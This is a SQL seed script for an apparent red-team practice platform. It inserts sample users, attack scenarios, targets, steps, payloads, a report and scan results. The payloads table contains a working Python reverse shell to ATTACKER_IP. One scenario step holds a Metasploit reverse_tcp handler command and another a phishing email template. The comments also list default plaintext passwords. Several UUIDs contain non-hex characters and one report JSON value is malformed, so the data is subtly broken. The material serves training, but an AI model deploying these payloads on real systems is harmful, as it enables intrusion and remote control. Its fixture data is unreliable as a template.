-- Connect to the database
\c ai_redteam;

-- Empty tables first to avoid duplicate key errors
TRUNCATE TABLE scanning_results CASCADE;
TRUNCATE TABLE reports CASCADE;
TRUNCATE TABLE payloads CASCADE;
TRUNCATE TABLE scenario_steps CASCADE;
TRUNCATE TABLE scenario_targets CASCADE;
TRUNCATE TABLE scenarios CASCADE;
TRUNCATE TABLE users CASCADE;

-- Insert sample users
-- Passwords are hashed versions of 'admin123', 'redteam123', and 'user123'
INSERT INTO users (id, email, hashed_password, full_name, is_active, role, created_at, updated_at)
VALUES
    ('3a7bd691-bc3d-4d3a-8a1a-72f4df356f01', 'admin@example.com', '$2b$12$WJVjJ1YVVMwYmUzPGw3jkOSRrHlvUzWcHprd0QGLPIlPC3sTPdiry', 'Admin User', TRUE, 'admin', NOW(), NOW()),
    ('c8c0b2b7-af6d-4be8-ae4c-1cd0e0d89781', 'redteam@example.com', '$2b$12$jCVUO5FMhSZh.QO9JbNl9edYzNr2hsMMvKK0HOTxjS3yhXJJB.qLy', 'Red Team User', TRUE, 'red_team', NOW(), NOW()),
    ('f2c8b9a1-3d4e-5f6a-7b8c-9d0e1f2a3b4c', 'user@example.com', '$2b$12$jd.qpMYC2gRGYSvdpvVZ2O8q2nQwrI4jPxXh9DH/Hl2s81SRUbFEu', 'Regular User', TRUE, 'user', NOW(), NOW());

-- Insert sample scenarios
INSERT INTO scenarios (id, name, description, objective, attack_type, difficulty, tags, is_ai_generated, created_by, status, created_at, updated_at)
VALUES
    ('b7d98f6a-05e4-4c7b-82d1-9e55684a91b2', 'Phishing Campaign Simulation', 'Simulate a sophisticated phishing campaign targeting an organization', 'Test organization''s resilience against phishing attacks', 'phishing', 7, '["phishing", "social_engineering", "email"]', FALSE, '3a7bd691-bc3d-4d3a-8a1a-72f4df356f01', 'planned', NOW(), NOW()),
    ('e4a5d2c1-8b09-4f7d-9e3a-6c2f5d8e1b0a', 'Privilege Escalation Practice', 'Simulate various privilege escalation techniques in a controlled environment', 'Practice and learn common privilege escalation paths', 'custom', 8, '["privilege_escalation", "lateral_movement", "post_exploitation"]', TRUE, 'c8c0b2b7-af6d-4be8-ae4c-1cd0e0d89781', 'completed', NOW() - INTERVAL '2 DAYS', NOW() - INTERVAL '1 DAY'),
    ('a1b2c3d4-5e6f-7a8b-9c0d-1e2f3a4b5c6d', 'Network Enumeration Exercise', 'Practice network enumeration and reconnaissance techniques', 'Map network topology and identify vulnerable services', 'recon', 5, '["enumeration", "reconnaissance", "network_scanning"]', FALSE, 'c8c0b2b7-af6d-4be8-ae4c-1cd0e0d89781', 'running', NOW() - INTERVAL '1 DAY', NOW());

-- Insert sample scenario targets
INSERT INTO scenario_targets (id, scenario_id, name, description, ip_address, hostname, operating_system, services, vulnerabilities)
VALUES
    ('f9e8d7c6-b5a4-3c2d-1e0f-9a8b7c6d5e4f', 'b7d98f6a-05e4-4c7b-82d1-9e55684a91b2', 'Finance Department', 'Target finance department employees', '10.0.0.1/24', 'finance.example.com', 'Windows 10', '["smtp", "http", "https"]', '["outdated_browser", "lack_of_security_training"]'),
    ('a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6', 'e4a5d2c1-8b09-4f7d-9e3a-6c2f5d8e1b0a', 'Linux Web Server', 'Apache web server with outdated plugins', '192.168.1.10', 'web1.example.com', 'Ubuntu 18.04 LTS', '["http", "ssh", "mysql"]', '["CVE-2021-12345", "weak_ssh_configuration", "outdated_apache"]'),
    ('7f6e5d4c-3b2a-1c0d-9e8f-7a6b5c4d3e2f', 'a1b2c3d4-5e6f-7a8b-9c0d-1e2f3a4b5c6d', 'Corporate Network', 'Main corporate network segment', '192.168.0.0/24', 'corp.example.com', 'Mixed', '["dns", "ldap", "kerberos", "smb"]', '["legacy_systems", "misconfigured_firewall"]');

-- Insert sample scenario steps
INSERT INTO scenario_steps (id, scenario_id, name, description, attack_type, commands, payload, status, "order")
VALUES
    ('1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p', 'b7d98f6a-05e4-4c7b-82d1-9e55684a91b2', 'Reconnaissance', 'Gather information about target organization', 'recon', '["whois example.com", "theHarvester -d example.com -b all"]', NULL, 'draft', 1),
    ('2b3c4d5e-6f7g-8h9i-0j1k-2l3m4n5o6p7q', 'b7d98f6a-05e4-4c7b-82d1-9e55684a91b2', 'Create Phishing Email', 'Design convincing phishing email template', 'phishing', NULL, 'Subject: Urgent Security Update Required\n\nDear Colleague,\n\nOur IT security team has detected suspicious activity on your account...\n', 'draft', 2),
    ('3c4d5e6f-7g8h-9i0j-1k2l-3m4n5o6p7q8r', 'e4a5d2c1-8b09-4f7d-9e3a-6c2f5d8e1b0a', 'Initial Access', 'Gain initial access to the target system', 'custom', '["msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST attacker.ip; set LPORT 4444; run\""]', NULL, 'completed', 1);

-- Insert sample payloads
INSERT INTO payloads (id, name, description, payload_type, language, code, tags, is_ai_generated, created_by, status, is_obfuscated)
VALUES
    ('c9d8e7f6-5g4h-3i2j-1k0l-m9n8o7p6q5r', 'Basic Reverse Shell', 'Simple Python reverse shell for demonstration', 'reverse_shell', 'python', 'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("ATTACKER_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])', '["reverse_shell", "python", "basic"]', FALSE, 'c8c0b2b7-af6d-4be8-ae4c-1cd0e0d89781', 'ready', FALSE),
    ('d1e2f3a4-b5c6-d7e8-f9a0-b1c2d3e4f5a6', 'PowerShell Keylogger', 'Educational PowerShell keylogger simulation', 'keylogger', 'powershell', '$code = @"\nusing System;\nusing System.Runtime.InteropServices;\nusing System.IO;\nusing System.Text;\nusing System.Diagnostics;\n\npublic class KeyLogger {\n    [DllImport("user32.dll")]\n    public static extern int GetAsyncKeyState(int i);\n    \n    // This is a simulation and not an actual keylogger for educational purposes only\n    public static void Simulate() {\n        Console.WriteLine("This is a simulated keylogger for educational purposes only.");\n        Console.WriteLine("No actual keylogging functionality is implemented.");\n    }\n}\n"@\n\nAdd-Type -TypeDefinition $code\n\n[KeyLogger]::Simulate()', '["keylogger", "powershell", "simulation"]', TRUE, '3a7bd691-bc3d-4d3a-8a1a-72f4df356f01', 'tested', FALSE);

-- Insert sample reports
INSERT INTO reports (id, title, description, scenario_id, created_by, report_data, format, status)
VALUES
    ('f5e4d3c2-b1a0-9f8e-7d6c-5b4a3c2d1e0f', 'Privilege Escalation Exercise Report', 'Detailed report of privilege escalation exercise results', 'e4a5d2c1-8b09-4f7d-9e3a-6c2f5d8e1b0a', 'c8c0b2b7-af6d-4be8-ae4c-1cd0e0d89781', '{"summary": "Successfully exploited 7 of 10 privilege escalation vectors", "mitre_techniques": ["T1068", "T1078", "T1140"], "recommendations": ["Implement regular patching", "Use principle of least privilege"], "cvss_scores": {"overall": 7.8, "vectors": {"AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}}}', 'html', 'completed');

-- Insert sample scanning results
INSERT INTO scanning_results (id, name, description, target_network, scan_type, results, created_by, duration, hosts_count, vulnerabilities_count)
VALUES
    ('a9b8c7d6-e5f4-g3h2-i1j0-k9l8m7n6o5p4', 'Network Vulnerability Scan', 'Comprehensive vulnerability scan of corporate network', '192.168.0.0/24', 'vulnerability', '{"total_hosts": 45, "vulnerable_hosts": 12, "critical_vulnerabilities": 3, "high_vulnerabilities": 8, "medium_vulnerabilities": 15, "low_vulnerabilities": 22, "details": {"critical": [{"name": "MS17-010 EternalBlue", "hosts": ["192.168.0.23", "192.168.0.45"]}, {"name": "CVE-2021-44228 Log4Shell", "hosts": ["192.168.0.17"]}]}}', '3a7bd691-bc3d-4d3a-8a1a-72f4df356f01', 325.5, 45, 48); 